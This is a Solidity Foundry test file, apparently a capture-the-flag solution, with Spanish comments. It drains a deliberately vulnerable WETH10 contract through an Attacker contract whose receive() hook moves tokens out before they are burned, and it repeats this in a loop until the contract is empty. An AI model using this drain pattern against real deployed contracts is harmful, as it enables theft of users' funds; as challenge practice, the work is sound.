// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/WETH10.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");


        vm.startPrank(bob);

        // hack time!

        // Realizamos el ataque a través de un contrato auxiliar, que nos envía los WETH10 antes de que sean quemados
        Attacker attacker = new Attacker();

        // Lo optimizamos en un bucle que retira la cantidad máxima cada vez
        while(address(weth).balance > 0) {
            uint256 amount = Math.min(address(weth).balance, address(bob).balance);
            //console.log("recover", amount);
            attacker.attack{value: amount}(address(weth));
            weth.withdraw(amount);
        }

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

/*
* Contrato auxiliar tacante
*/
contract Attacker {

    address owner = msg.sender;

    /*
    * Ejecuta el ataque
    */
    function attack(address _victim) public payable {
        WETH10 victim = WETH10(payable(_victim));

        // Depositamos los fondos para obtener tokens
        victim.deposit{value: msg.value}();

        // Retiramos los fondos
        victim.withdrawAll();
    }

    receive() external payable {
        // Transferimos los tokens al owner antes de que _burnAll() los queme
        WETH10(payable(msg.sender)).transfer(owner, msg.value);

        // Transferimos los fondos al owner
        payable(owner).transfer(msg.value);
    }
}